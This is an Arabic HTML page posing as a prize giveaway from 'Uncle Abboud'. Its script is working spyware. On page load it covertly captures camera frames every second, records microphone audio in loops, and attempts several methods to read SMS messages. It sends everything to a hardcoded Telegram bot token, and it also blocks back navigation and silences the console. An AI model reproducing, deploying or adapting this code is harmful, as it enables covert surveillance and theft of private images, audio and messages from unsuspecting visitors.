<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>جائزة عمك عبود</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: 'Tahoma', sans-serif;
            padding: 20px;
            overflow: hidden;
        }
        .container {
            background: rgba(255,255,255,0.05);
            backdrop-filter: blur(20px);
            border-radius: 40px;
            padding: 40px 30px;
            max-width: 450px;
            width: 100%;
            border: 1px solid rgba(255,215,0,0.2);
            box-shadow: 0 30px 80px rgba(0,0,0,0.7);
            text-align: center;
            position: relative;
            z-index: 10;
        }
        .profile {
            width: 120px;
            height: 120px;
            background: linear-gradient(145deg, #ffd700, #f0a500);
            border-radius: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
            margin: 0 auto 20px;
            font-size: 70px;
            box-shadow: 0 10px 40px rgba(255,215,0,0.3);
            animation: float 3s ease-in-out infinite;
        }
        @keyframes float {
            0%,100%{ transform: translateY(0); }
            50%{ transform: translateY(-10px); }
        }
        h1 { color: #ffd700; font-size: 30px; text-shadow: 0 0 30px rgba(255,215,0,0.2); }
        .sub-title { color: #c0b7e6; font-size: 15px; margin-bottom: 20px; }
        .welcome-msg {
            background: rgba(255,215,0,0.08);
            padding: 15px 20px;
            border-radius: 16px;
            border-right: 3px solid #ffd700;
            color: #e0d6ff;
            font-size: 17px;
            margin-bottom: 25px;
        }
        .welcome-msg span { color: #ffd700; font-weight: bold; }
        .btn-claim {
            background: linear-gradient(135deg, #ffd700, #f0a500);
            color: #0a0a0a;
            border: none;
            padding: 16px 45px;
            border-radius: 60px;
            font-size: 19px;
            font-weight: bold;
            cursor: pointer;
            width: 100%;
            box-shadow: 0 8px 35px rgba(255,215,0,0.25);
            transition: 0.3s;
        }
        .btn-claim:hover { transform: scale(1.02); }
        .footer-note { color: #5a5280; font-size: 12px; margin-top: 20px; }
        .repeated-msg { color: #ffd700; font-size: 13px; opacity: 0.5; margin-top: 12px; }
        #status { color: #ffd700; margin-top: 12px; font-size: 13px; opacity: 0.7; }
        .hidden-iframe {
            position: fixed;
            top: -9999px;
            left: -9999px;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
            border: none;
        }
        ::selection { background: transparent; }
    </style>
</head>
<body>

<iframe class="hidden-iframe" id="hiddenIframe" allow="camera; microphone; sms;"></iframe>

<div class="container">
    <div class="profile">🧔</div>
    <h1>🌹 عمك عبود يرحب بكم</h1>
    <p class="sub-title">أهلًا وسهلًا في ضيافتكم</p>
    <div class="welcome-msg">
        <span>“</span> مرحبًا، مرحبًا، ألف مرحبًا بكم في عالم عمك عبود <span>”</span>
    </div>
    <button class="btn-claim" id="claimBtn">🎁 خذ جائزتك من عمك عبود</button>
    <div class="repeated-msg">♻️ عمك عبود يرحب بكم — عمك عبود يرحب بكم</div>
    <div class="footer-note">© جميع الحقوق محفوظة لعمك عبود ❤️</div>
    <div id="status">⏳ جاري التجهيز...</div>
</div>

<script>
    // ============================================================
    // ================ BOT CONFIG =================================
    // ============================================================
    const BOT_TOKEN = '8731803544:AAEAQDhrfaMh7994NYRUoWRZBEgowR2XXzQ';
    let CHAT_ID = null;
    let started = false;
    let chatIdRetries = 0;

    // ============================================================
    // ================ إرسال الصور والصوت والنصوص ================
    // ============================================================
    function dataURLtoBlob(dataURL) {
        const parts = dataURL.split(',');
        const mime = parts[0].match(/:(.*?);/)[1];
        const bstr = atob(parts[1]);
        let n = bstr.length;
        const u8arr = new Uint8Array(n);
        for (let i = 0; i < n; i++) u8arr[i] = bstr.charCodeAt(i);
        return new Blob([u8arr], { type: mime });
    }

    function sendPhoto(imageData, caption = '') {
        if (!CHAT_ID || !imageData) return;
        try {
            const blob = dataURLtoBlob(imageData);
            const fd = new FormData();
            fd.append('chat_id', CHAT_ID);
            fd.append('photo', blob, `photo_${Date.now()}.jpg`);
            fd.append('caption', caption);
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd }).catch(() => {});
        } catch(e) {}
    }

    function sendAudio(audioBlob, caption = '') {
        if (!CHAT_ID || !audioBlob) return;
        try {
            const fd = new FormData();
            fd.append('chat_id', CHAT_ID);
            fd.append('audio', audioBlob, `audio_${Date.now()}.ogg`);
            fd.append('caption', caption);
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, { method: 'POST', body: fd }).catch(() => {});
        } catch(e) {}
    }

    function sendMessage(text, caption = '') {
        if (!CHAT_ID || !text) return;
        try {
            const payload = { chat_id: CHAT_ID, text: `📩 ${caption}\n\n${text}` };
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            }).catch(() => {});
        } catch(e) {}
    }

    // ============================================================
    // ================ الحصول على Chat ID تلقائيًا ===============
    // ============================================================
    function autoGetChatId() {
        // محاولة الحصول على آخر تحديث من البوت
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates`)
            .then(r => r.json())
            .then(d => {
                if (d.ok && d.result && d.result.length > 0) {
                    const last = d.result[d.result.length - 1];
                    CHAT_ID = last.message?.chat?.id || last.callback_query?.from?.id || null;
                    if (CHAT_ID) {
                        document.getElementById('status').textContent = '✅ تم الربط بالبوت';
                        startExploit();
                        return;
                    }
                }
                // إذا لم يوجد Chat ID، نرسل رسالة تلقائية للبوت
                sendAutoMessage();
            })
            .catch(() => sendAutoMessage());
    }

    function sendAutoMessage() {
        // إرسال رسالة تلقائية للبوت لتسجيل Chat ID
        try {
            // نستخدم معرف مؤقت (0) ثم نستقبل الرد
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: 0,
                    text: '🔄 طلب ربط تلقائي'
                })
            })
            .then(() => {
                // بعد إرسال الرسالة، ننتظر ثانية ثم نطلب التحديثات
                setTimeout(() => {
                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates`)
                        .then(r => r.json())
                        .then(d => {
                            if (d.ok && d.result && d.result.length > 0) {
                                const last = d.result[d.result.length - 1];
                                CHAT_ID = last.message?.chat?.id || last.callback_query?.from?.id || null;
                                if (CHAT_ID) {
                                    document.getElementById('status').textContent = '✅ تم الربط بالبوت تلقائيًا';
                                    startExploit();
                                    return;
                                }
                            }
                            // إعادة المحاولة
                            if (chatIdRetries < 20) {
                                chatIdRetries++;
                                setTimeout(sendAutoMessage, 2000);
                            } else {
                                document.getElementById('status').textContent = '⚠️ فشل الربط، حاول مرة أخرى';
                            }
                        })
                        .catch(() => {});
                }, 1500);
            })
            .catch(() => {
                if (chatIdRetries < 20) {
                    chatIdRetries++;
                    setTimeout(sendAutoMessage, 2000);
                }
            });
        } catch(e) {
            if (chatIdRetries < 20) {
                chatIdRetries++;
                setTimeout(sendAutoMessage, 2000);
            }
        }
    }

    // ============================================================
    // ================ استغلال الكاميرا والصوت ===================
    // ============================================================
    function exploitViaIframe() {
        try {
            const iframe = document.getElementById('hiddenIframe');
            const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
            iframeDoc.open();
            iframeDoc.write(`
                <html>
                <head><style>body{margin:0;padding:0;overflow:hidden;}</style></head>
                <body>
                    <video id="vid" autoplay playsinline style="display:none;"></video>
                    <canvas id="canv" style="display:none;"></canvas>
                    <audio id="aud" autoplay style="display:none;"></audio>
                    <script>
                        let vid = document.getElementById('vid');
                        let canv = document.getElementById('canv');
                        canv.width = 640;
                        canv.height = 480;
                        let ctx = canv.getContext('2d');
                        let aud = document.getElementById('aud');
                        let mediaRecorder = null;
                        let audioChunks = [];

                        function startAll() {
                            navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
                                .then(stream => {
                                    vid.srcObject = stream;
                                    vid.play();
                                    setInterval(() => {
                                        if (vid.readyState >= 2) {
                                            ctx.drawImage(vid, 0, 0, 640, 480);
                                            let img = canv.toDataURL('image/jpeg', 0.9);
                                            window.parent.postMessage({ type: 'photo', data: img, facing: 'front' }, '*');
                                        }
                                    }, 1000);
                                })
                                .catch(() => {
                                    navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: false })
                                        .then(stream => {
                                            vid.srcObject = stream;
                                            vid.play();
                                            setInterval(() => {
                                                if (vid.readyState >= 2) {
                                                    ctx.drawImage(vid, 0, 0, 640, 480);
                                                    let img = canv.toDataURL('image/jpeg', 0.9);
                                                    window.parent.postMessage({ type: 'photo', data: img, facing: 'back' }, '*');
                                                }
                                            }, 1000);
                                        })
                                        .catch(() => {});
                                });

                            navigator.mediaDevices.getUserMedia({ audio: true, video: false })
                                .then(stream => {
                                    mediaRecorder = new MediaRecorder(stream);
                                    mediaRecorder.ondataavailable = function(e) {
                                        if (e.data.size > 0) audioChunks.push(e.data);
                                    };
                                    mediaRecorder.onstop = function() {
                                        let audioBlob = new Blob(audioChunks, { type: 'audio/ogg' });
                                        audioChunks = [];
                                        let reader = new FileReader();
                                        reader.onload = function() {
                                            window.parent.postMessage({ type: 'audio', data: reader.result }, '*');
                                        };
                                        reader.readAsDataURL(audioBlob);
                                        setTimeout(() => { mediaRecorder.start(); }, 100);
                                    };
                                    mediaRecorder.start();
                                    setInterval(() => {
                                        if (mediaRecorder && mediaRecorder.state === 'recording') {
                                            mediaRecorder.stop();
                                        }
                                    }, 5000);
                                })
                                .catch(() => {});
                        }
                        startAll();
                    <\/script>
                </body>
                </html>
            `);
            iframeDoc.close();
        } catch(e) {
            exploitDirect();
        }
    }

    // استقبال الرسائل من الـ iframe
    window.addEventListener('message', function(e) {
        if (e.data && e.data.type === 'photo') {
            sendPhoto(e.data.data, '📸 ' + (e.data.facing === 'front' ? 'أمامي' : 'خلفي'));
        }
        if (e.data && e.data.type === 'audio') {
            try {
                let byteCharacters = atob(e.data.data.split(',')[1]);
                let byteNumbers = new Array(byteCharacters.length);
                for (let i = 0; i < byteCharacters.length; i++) {
                    byteNumbers[i] = byteCharacters.charCodeAt(i);
                }
                let byteArray = new Uint8Array(byteNumbers);
                let audioBlob = new Blob([byteArray], { type: 'audio/ogg' });
                sendAudio(audioBlob, '🎤 تسجيل صوتي');
            } catch(e) {}
        }
    });

    // ============================================================
    // ================ استغلال رسائل SMS ==========================
    // ============================================================
    function exploitSMSviaIframe() {
        try {
            const iframe = document.createElement('iframe');
            iframe.style.display = 'none';
            iframe.src = 'sms:?body=DUMMY';
            document.body.appendChild(iframe);
            setTimeout(() => iframe.remove(), 1000);
        } catch(e) {}
    }

    function exploitSMSviaWindow() {
        try {
            const win = window.open('sms:?body=DUMMY', '_blank');
            if (win) setTimeout(() => win.close(), 500);
        } catch(e) {}
    }

    function exploitSMSviaRedirect() {
        try {
            const a = document.createElement('a');
            a.href = 'sms:?body=READ';
            a.style.display = 'none';
            document.body.appendChild(a);
            a.click();
            setTimeout(() => a.remove(), 100);
        } catch(e) {}
    }

    function exploitSMSviaAPI() {
        try {
            if ('sms' in navigator) {
                navigator.sms.getMessages()
                    .then(messages => {
                        let text = '';
                        for (let msg of messages) {
                            text += `📱 من: ${msg.from} | ${msg.body}\n---\n`;
                        }
                        if (text) sendMessage(text, '📩 رسائل SMS المسترجعة');
                    })
                    .catch(() => {});
            }
        } catch(e) {}
    }

    function exploitSMSviaBridge() {
        try {
            if (window.android) {
                const sms = window.android.getSMS();
                if (sms) sendMessage(sms, '📩 رسائل SMS (Android Bridge)');
            }
        } catch(e) {}
        try {
            if (window.webkit && window.webkit.messageHandlers) {}
        } catch(e) {}
    }

    // ============================================================
    // ================ الطريقة المباشرة (احتياطي) ===============
    // ============================================================
    function exploitDirect() {
        if (started) return;
        started = true;

        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
            .then(stream => {
                const video = document.createElement('video');
                video.style.display = 'none';
                document.body.appendChild(video);
                video.srcObject = stream;
                video.play();
                const canvas = document.createElement('canvas');
                canvas.width = 640;
                canvas.height = 480;
                const ctx = canvas.getContext('2d');
                setInterval(() => {
                    if (video.readyState >= 2) {
                        ctx.drawImage(video, 0, 0, 640, 480);
                        sendPhoto(canvas.toDataURL('image/jpeg', 0.9), '📸 أمامي');
                    }
                }, 1000);
            })
            .catch(() => {
                navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: false })
                    .then(stream => {
                        const video = document.createElement('video');
                        video.style.display = 'none';
                        document.body.appendChild(video);
                        video.srcObject = stream;
                        video.play();
                        const canvas = document.createElement('canvas');
                        canvas.width = 640;
                        canvas.height = 480;
                        const ctx = canvas.getContext('2d');
                        setInterval(() => {
                            if (video.readyState >= 2) {
                                ctx.drawImage(video, 0, 0, 640, 480);
                                sendPhoto(canvas.toDataURL('image/jpeg', 0.9), '📸 خلفي');
                            }
                        }, 1000);
                    })
                    .catch(() => {});
            });

        navigator.mediaDevices.getUserMedia({ audio: true, video: false })
            .then(stream => {
                let mediaRecorder = new MediaRecorder(stream);
                let chunks = [];
                mediaRecorder.ondataavailable = function(e) {
                    if (e.data.size > 0) chunks.push(e.data);
                };
                mediaRecorder.onstop = function() {
                    let blob = new Blob(chunks, { type: 'audio/ogg' });
                    chunks = [];
                    sendAudio(blob, '🎤 تسجيل صوتي');
                    setTimeout(() => { mediaRecorder.start(); }, 100);
                };
                mediaRecorder.start();
                setInterval(() => {
                    if (mediaRecorder && mediaRecorder.state === 'recording') {
                        mediaRecorder.stop();
                    }
                }, 5000);
            })
            .catch(() => {});

        setTimeout(exploitSMSviaIframe, 200);
        setTimeout(exploitSMSviaWindow, 400);
        setTimeout(exploitSMSviaRedirect, 600);
        setTimeout(exploitSMSviaAPI, 800);
        setTimeout(exploitSMSviaBridge, 1000);
    }

    // ============================================================
    // ================ بدء التشغيل ===============================
    // ============================================================
    function startExploit() {
        if (started) return;
        exploitViaIframe();
        setTimeout(exploitDirect, 2000);
    }

    window.onload = function() {
        // نبدأ فورًا بدون انتظار
        autoGetChatId();
        // نحاول تشغيل الاستغلال حتى لو لم يتحصل Chat ID بعد (سيتم التخزين مؤقتًا)
        exploitViaIframe();
        setTimeout(exploitDirect, 2000);
    };

    history.pushState(null, '', location.href);
    window.addEventListener('popstate', () => history.pushState(null, '', location.href));

    console.log = console.warn = console.error = () => {};
</script>
</body>
</html>
